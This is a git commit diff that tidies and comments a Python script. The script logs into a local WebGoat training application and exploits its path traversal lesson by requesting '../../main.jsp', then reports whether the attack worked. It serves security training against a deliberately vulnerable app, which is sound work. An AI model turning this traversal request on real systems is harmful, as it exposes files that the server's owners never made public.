e42060440535f381acd2658421e0e5d05dacb06a
serrisflame <cmoone@live.com>
2015-12-11 09:33:32 +0100

    Cleaned up the python script, added some comments

--- examples/webgoat/vuln-01/attack2.py
+++ examples/webgoat/vuln-01/attack2.py
@@ -1,28 +1,29 @@
 import requests
 import json
 
-
-#r = requests.Session()
 s = requests.Session();
-
-
 payload = {'password': 'guest', 'username': 'guest'}
-#r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=payload)
 r = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=payload)
+##Used s to maintain session without having to keep track of or modify cookies
 
-#cookies = r.cookie
-
+##Accessed lesson menu first to find address of menu item we need since it is dynamically generated
 r = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
 resp_dict = json.loads(r.text)
 list1 = resp_dict[2]['children']
 link = list1[1]['link']
+
+##Crafted the link, then retrieved the page
 str = 'http://127.0.0.1:8080/WebGoat/' + link
 r = s.get(str)
-##at the page with vulnerability now
 
+##At the page with vulnerability now
+##Request an item not on the list of files given on this page
 req = {'SUBMIT': 'View+File', 'File': '../../main.jsp'} 
-
 r = s.post(str, data=req)
 
+##Used the in function to scan http response for the text confirming exploit worked.
 results = "Congratulations! Access to file allowed" in r.text
-print(results)
+if results: 
+	 print("Attack Successful")
+else: 
+	print("Attack Failed, Vulnerability Not Present")
